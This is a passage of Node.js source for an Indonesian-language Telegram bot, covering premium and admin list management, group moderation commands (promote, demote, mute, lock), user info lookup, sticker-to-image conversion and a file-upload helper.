        const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

        const response = await axios.get(fileLink, { responseType: "arraybuffer" });
        const inputBuffer = Buffer.from(response.data);

        const pngBuffer = await sharp(inputBuffer).png().toBuffer();

        await bot.sendPhoto(chatId, pngBuffer, {
            caption: "✅ Berhasil."
        });

        await bot.deleteMessage(chatId, waitingMsg.message_id);

    } catch (error) {
        console.error("ToImage Error:", error);
        bot.editMessageText("❌ Gagal. Mungkin stiker ini beranimasi.", {
            chat_id: chatId,
            message_id: waitingMsg.message_id
        });
    }
});

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
if (shouldIgnoreMessage(msg)) return

if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
  
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "⚡ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "⚡ Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "⚡ Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "⚡ Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "⚡ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); 
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
  
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "⚡ You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id
    if (shouldIgnoreMessage(msg)) return
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "⚡ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "⚡ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `⚡ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (shouldIgnoreMessage(msg)) return
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "⚡ You are not authorized to remove prem users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "⚡ Please provide a user ID. Example: /prem 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "⚡ Invalid input. User ID must be a number.");
    }

    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `⚡ User ${userId} is not in the regis list.`);
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (shouldIgnoreMessage(msg)) return
            
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
 
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "⚡ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "⚡ Invalid input. Example: /deladmin 6843967527.");
    }

    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `⚡ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/groupAktip/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
    
    const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(true); 
        await bot.sendMessage(chatId, "✅ Mode hanya grup diaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat mengaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengaktifkan mode hanya grup.");
    }
});

bot.onText(/\/groupNonaktif/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
    
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(false); 
        await bot.sendMessage(chatId, "✅ Mode hanya grup dinonaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat menonaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menonaktifkan mode hanya grup.");
    }
});
bot.onText(/\/addgroup/, async (msg) => {

    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }

    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
        
        if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" }); 
        
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
    { parse_mode: "Markdown" }
  );
}

        addGroupToAllowed(chatId); 
    } catch (error) {
        console.error('Error adding group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menambahkan grup.');
    }
});

bot.onText(/\/delgroup/, async (msg) => {
    
    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
        
        if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
  
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
            { parse_mode: "Markdown" }
        );
    }

        removeGroupFromAllowed(chatId); 
    } catch (error) {
        console.error('Error deleting group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menghapus grup.');
    }
});

bot.onText(/^\/delsesi$/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

  try {
    if (fs.existsSync(SESSIONS_DIR)) {
      fs.rmSync(SESSIONS_DIR, { recursive: true, force: true });
    }
    fs.mkdirSync(SESSIONS_DIR, { recursive: true });

    if (fs.existsSync(SESSIONS_FILE)) {
      fs.unlinkSync(SESSIONS_FILE);
    }

    bot.sendMessage(chatId, "✅ Semua sesi berhasil dihapus.");
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal menghapus sesi.");
  }
});

bot.onText(/^\/restart$/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (shouldIgnoreMessage(msg)) return
 
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

  const progressMsg = await bot.sendMessage(chatId, "♻️ Restarting bot... [░░░░░░░░░░]");
  let progress = 0;

  const interval = setInterval(async () => {
    progress += 10;
    const bar = "█".repeat(progress / 10) + "░".repeat(10 - progress / 10);
    await bot.editMessageText(`♻️ Restarting bot... [${bar}] ${progress}%`, {
      chat_id: chatId,
      message_id: progressMsg.message_id
    });

    if (progress >= 100) {
      clearInterval(interval);

      setTimeout(() => {
        const args = [...process.argv.slice(1), "--restarted", String(chatId)];
        const child = spawn(process.argv[0], args, {
          detached: true,
          stdio: "inherit",
        });
        child.unref();
        process.exit(0);
      }, 1000);
    }
  }, 200);
});

bot.onText(/\/listgroup/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "⛔ Fitur ini hanya untuk owner atau admin.");
  }

  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (!groupIds.length) {
      return bot.sendMessage(chatId, "📭 Belum ada grup yang ditambahkan.");
    }

    let text = `📋 *Daftar Grup yang Diizinkan:*\n\n`;

    for (const id of groupIds) {
      try {
        const chat = await bot.getChat(id);
        const title = chat.title || 'Tidak diketahui';
        text += `🔹 *${title}*\n🆔 \`${id}\`\n\n`;
      } catch {
        text += `⚠️ [Gagal ambil info] ID: \`${id}\`\n\n`;
      }
    }

    bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal membaca daftar grup:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membaca daftar grup.");
  }
});


// === /DEMOTE ADMIN DI TELEGRAM ===
bot.onText(/^\/demote$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (String(senderId) !== String(OWNER_ID)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa pake perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply) return bot.sendMessage(chatId, "❌ Balas pesan user yang mau di-demote.");

  const userId = reply.from.id;

  try {
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: false,
      can_promote_members: false
    });

    bot.sendMessage(chatId, `✅ Sukses demote [user](tg://user?id=${userId}).`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal demote: ${err.message}`);
  }
});
// === /PROMOTE DENGAN CUSTOM ADMIN TITLE DI TELEGRAM ===
bot.onText(/^\/promote(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return

  if (String(senderId) !== String(OWNER_ID)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa pake perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply) return bot.sendMessage(chatId, "❌ Balas pesan user yang mau di-promote.");

  const userId = reply.from.id;
  const label = match[1]?.trim();

  try {
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: true,
      can_promote_members: false
    });
    
    if (label) {
      await bot.setChatAdministratorCustomTitle(chatId, userId, label);
    }

    const name = reply.from.username ? `@${reply.from.username}` : `[user](tg://user?id=${userId})`;
    const status = label ? `\`${label}\`` : "*Admin*";

    bot.sendMessage(chatId, `✅ ${name} sekarang jadi ${status}`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal promote: ${err.message}`);
  }
});

bot.onText(/^\/(opengb|close)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1].toLowerCase();
  const userId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
  
  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya bisa di grup Telegram!');
  }

  try {
    const admins = await bot.getChatAdministrators(chatId);
    const isOwner = admins.some(admin => admin.user.id === userId);
    if (!isOwner) return bot.sendMessage(chatId, '❌ Lu bukan admin bang!');

    if (command === 'close') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: false
      });
      return bot.sendMessage(chatId, '🔒 Grup telah *dikunci*! Hanya admin yang bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

    if (command === 'opengb') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false
      });
      return bot.sendMessage(chatId, '🔓 Grup telah *dibuka*! Semua member bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

  } catch (err) {
    console.error('Gagal atur izin:', err);
    return bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengatur grup.');
  }
});

// === MUTE ===
bot.onText(/\/mute(?:\s+(\d+[a-zA-Z]+|selamanya))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return
   
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
  
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus admin gc.",
            { parse_mode: "Markdown" }
        );
    }
  
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  let duration = 60; 
  const raw = match[1];

  if (raw) {
    if (raw.toLowerCase() === 'selamanya') {
      duration = 60 * 60 * 24 * 365 * 100; 
    } else {
      const regex = /^(\d+)(s|m|h|d|w|mo|y)$/i;
      const parts = raw.match(regex);
      if (parts) {
        const value = parseInt(parts[1]);
        const unit = parts[2].toLowerCase();
        const unitMap = { s: 1, m: 60, h: 3600, d: 86400, w: 604800, mo: 2592000, y: 31536000 };
        duration = value * (unitMap[unit] || 60);
      }
    }
  }

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk mute.");

  try {
    const until = Math.floor(Date.now() / 1000) + duration;
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: false,
      until_date: until,
    });
    bot.sendMessage(chatId, `🔇 User dimute selama ${raw || '60s'} (${duration} detik)`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal mute user.");
  }
});

// === UNMUTE ===
bot.onText(/\/unmute/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus admin gc.",
            { parse_mode: "Markdown" }
        );
    }


  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk unmute.");

  try {
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
    });
    bot.sendMessage(chatId, `🔊 User telah di-unmute.`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal unmute user.");
  }
});

bot.onText(/\/info(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  let targetUser;  
  
  if (shouldIgnoreMessage(msg)) return;
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  try {
    if (msg.reply_to_message) {
      targetUser = msg.reply_to_message.from;
    }
   
    else if (match[1]) {
      const input = match[1].trim();
      if (input.startsWith("@")) {
        const username = input.slice(1);
        try {       
          const chat = await bot.getChat(input);
          targetUser = chat;
        } catch {
          if (msg.chat.type.endsWith("group")) {
            const memberList = await bot.getChatAdministrators(chatId);
            const found = memberList.find((m) => m.user.username?.toLowerCase() === username.toLowerCase());
            if (found) targetUser = found.user;
          }
        }
      } else {
        const userId = parseInt(input);
        const member = await bot.getChatMember(chatId, userId).catch(() => null);
        if (member) targetUser = member.user;
        else targetUser = await bot.getChat(userId).catch(() => null);
      }
    }

    if (!targetUser) targetUser = msg.from;

    let memberInfo = null;
    if (msg.chat.type.endsWith("group")) {
      memberInfo = await bot.getChatMember(chatId, targetUser.id).catch(() => null);
    }

    const statusMap = {
      creator: "👑 Owner Grup",
      administrator: "🛠️ Admin",
      member: "👤 Anggota",
      restricted: "🚫 Dibatasi",
      left: "🚪 Keluar",
      kicked: "⛔ Dikeluarkan",
    };

    const photos = await bot.getUserProfilePhotos(targetUser.id, { limit: 1 });
    const photo = photos.total_count > 0 ? photos.photos[0][0].file_id : null;

    const infoText = `
📇 <b>INFORMASI USER</b>
━━━━━━━━━━━━━━
🆔 <b>ID:</b> <code>${targetUser.id}</code>
👤 <b>Nama:</b> ${targetUser.first_name || "-"} ${targetUser.last_name || ""}
🏷️ <b>Username:</b> ${targetUser.username ? "@" + targetUser.username : "-"}
🤖 <b>Bot:</b> ${targetUser.is_bot ? "Ya" : "Tidak"}
💬 <b>Status di Grup:</b> ${memberInfo ? statusMap[memberInfo.status] || "❔ Tidak diketahui" : "📩 Chat pribadi"}
📜 <b>Bio:</b> ${(targetUser.bio || "–")}
━━━━━━━━━━━━━━
🕒 <i>Diminta oleh:</i> ${msg.from.first_name}
`;

    if (photo) {
      await bot.sendPhoto(chatId, photo, {
        caption: infoText,
        parse_mode: "HTML",
      });
    } else {
      await bot.sendMessage(chatId, infoText, { parse_mode: "HTML" });
    }

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal mendapatkan info user.\nKemungkinan user belum pernah kirim pesan di sini atau datanya terbatas.");
  }
});

// to url
async function CatBox(path) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', '');
    data.append('fileToUpload', fs.createReadStream(path));

    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: data.getHeaders(), 
        data: data
    };
    const api = await axios.request(config);
    return api.data;
}

function getFileExtension(contentType) {
    if (!contentType) {
        return '.bin'; 
    }
    if (contentType.includes('image/jpeg') || contentType.includes('image/jpg')) {
        return '.jpg';
    } else if (contentType.includes('image/png')) {
        return '.png';
    } else if (contentType.includes('image/gif')) {
        return '.gif';
    } else if (contentType.includes('video/mp4')) {
        return '.mp4';
    } else if (contentType.includes('video/quicktime')) {
        return '.mov'; 
    } else if (contentType.includes('audio/mpeg')) {
        return '.mp3';
    } else if (contentType.includes('audio/ogg')) {
        return '.ogg';
    } else if (contentType.includes('application/pdf')) {
        return '.pdf';
    } else if (contentType.includes('application/zip')) {
        return '.zip';
    } else {
        return '.bin'; 
    }
}

bot.onText(/\/tourl/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const message = msg;
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
